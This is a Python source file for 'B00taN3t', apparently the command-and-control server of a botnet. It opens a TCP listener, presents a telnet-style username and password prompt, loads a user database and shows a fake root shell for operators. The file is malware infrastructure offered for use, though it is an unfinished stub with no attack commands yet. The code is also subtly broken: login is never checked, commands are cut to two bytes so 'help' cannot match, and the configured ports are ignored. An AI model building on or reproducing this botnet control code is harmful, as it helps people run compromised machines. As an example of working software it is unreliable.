import socket, threading

from .client        import Client
from .users.main    import User

class BootaNet():
    CNC_PORT:       int = 1338;
    WEB_PORT:       int = 80;
    SERVER:         bool;
    BUF_SZ:         int = 1024;

    """ Server Logs """
    users:          list[User];
    clients:        list[Client];
    def __init__(self, cnc_p: int, web_p: int):
        print("[ + ] Starting up B00taN3t.....!")
        self.cnc_port = cnc_p;
        self.web_port = web_p;
        self.users = [];
        self.clients = [];
    
        dbfd = open("assets/db/users.db", "r");
        db_data = dbfd.read();
        db_lines = db_data.split("\n");

        print("[ + ] Loading User Database....!");

        for line in db_lines:
            if len(line) < 4: continue;
            line_info = line.replace("(", "").replace(")", "").replace("'", "").split(",")
            self.users.append(User(line_info))

        print("[ + ] Database loaded.....!")
            

    def start_cnc_server(self) -> bool:
        self.SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

        self.SERVER.bind(("0.0.0.0", self.CNC_PORT));
        self.SERVER.listen(0)

        self.server_listener()

        
    def server_listener(self) -> None:
        while(True):
            try: conn, addr = self.SERVER.accept()
            except: pass

            threading.Thread(target=self.server_authorization, args=(conn,)).start()


    def server_authorization(self, client) -> None:
        client.send("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22".encode())
        client.send("[?1000;1003;1006;1015h\r\n".encode())
        client.send("Username: ".encode())
        username = client.recv(self.BUF_SZ)
        print(f"{username}")

        client.send("Password: ".encode())
        password = client.recv(self.BUF_SZ).decode().strip()
        if password == "":
            password = client.recv(self.BUF_SZ).decode().strip()

        # Validate Login

        new_client = Client(username, client)
        self.clients.append(new_client)
        self.user_handler(new_client)

    def user_handler(self, client: Client) -> None:
        while(True):
            client.socket.send("[root@b00tab0t]# [~] ".encode())
            r_data = client.socket.recv(2)
            data = r_data.decode().strip()

            if len(data) <= 1: 
                client.socket.send("\r".encode())
                continue;

            if data.startswith("help"):
                client.socket.send("Test\r\n".encode())
            else:
                client.socket.send("[ X ] Error Invalid Command\r\n".encode())

            print(f"{r_data} | {data}")
